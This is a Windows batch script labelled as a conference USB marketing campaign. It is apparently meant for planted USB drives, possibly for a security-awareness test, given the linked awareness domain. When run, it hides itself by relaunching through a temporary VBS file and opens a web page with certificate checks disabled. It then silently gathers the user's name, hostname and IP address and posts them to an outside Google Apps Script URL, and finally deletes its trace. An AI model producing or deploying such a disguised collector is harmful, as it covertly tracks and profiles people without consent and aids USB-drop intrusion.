@echo off
:: ============================================================
::  Conference USB - Marketing Campaign
::  Edit the 3 lines below, copy to USB, done.
:: ============================================================
 
set SHEETS_URL=https://script.google.com/macros/s/AKfycbzszdfs_6r9JSblLJwT14h79hR9Ufj5ZrB3aanNLB2N4pjuaF8epylp6zKpTB2VclC2/exec
set MARKETING_URL=https://www.khipuawareness.co.uk/awareness/c8803bb920f32a6582260029c7404d983055d89355d291102c9fd2bea82e93e9/11/index.html
set USB_ID=USB-001
set SECRET=@kDeGGisN9UW
 
:: If not already running silently, relaunch self via VBS with no window
if "%1"=="silent" goto :run
echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\silent_usb.vbs"
echo WshShell.Run "cmd.exe /c ""%~f0"" silent", 0, False >> "%temp%\silent_usb.vbs"
start "" wscript.exe "%temp%\silent_usb.vbs"
exit /b
 
:run
:: Open marketing page immediately
start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" --app="%MARKETING_URL%" --ignore-certificate-errors
timeout /t 2 >nul
powershell -command "$sig='[DllImport(\"user32.dll\")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'; Add-Type -MemberDefinition $sig -Name Win32 -Namespace Win32Functions; $hwnd = (Get-Process chrome | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object -First 1).MainWindowHandle; [Win32Functions.Win32]::ShowWindowAsync($hwnd, 3)"

 
:: Silently collect and send data
powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command ^
  "$u=(whoami).Split('\')[-1];" ^
  "$h=$env:COMPUTERNAME;" ^
  "$ip=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127*' -and $_.IPAddress -notlike '169*'} | Select-Object -First 1).IPAddress;" ^
  "$t=[datetime]::UtcNow.ToString('o');" ^
  "$b='[{\"timestamp\":\"'+$t+'\",\"username\":\"'+$u+'\",\"hostname\":\"'+$h+'\",\"ip\":\"'+$ip+'\",\"usb_id\":\"%USB_ID%\",\"secret\":\"%SECRET%\"}]';" ^
  "try { Invoke-WebRequest -Uri '%SHEETS_URL%' -Method POST -Body $b -ContentType 'application/json' -UseBasicParsing } catch {}"
 
:: Cleanup temp vbs
del "%temp%\silent_usb.vbs" >nul 2>&1
 
 
